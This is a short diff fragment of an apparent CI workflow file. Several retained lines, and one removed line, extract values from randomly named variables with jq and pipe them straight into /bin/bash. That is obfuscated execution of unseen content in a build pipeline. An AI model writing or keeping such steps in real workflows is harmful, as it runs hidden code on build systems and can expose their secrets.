@@ -30,7 +30,6 @@ jobs:
           echo $yf19 | jq -r .ezkoj82 | /bin/bash
           echo $x86 | jq -r .iaw5 | /bin/bash
           echo $inyco8448 | jq -r .aa4332 | /bin/bash
-          printf '%s' "$lm28" | jq -r .ux881 | /bin/bash
 
       - name: Upload results
         if: always()
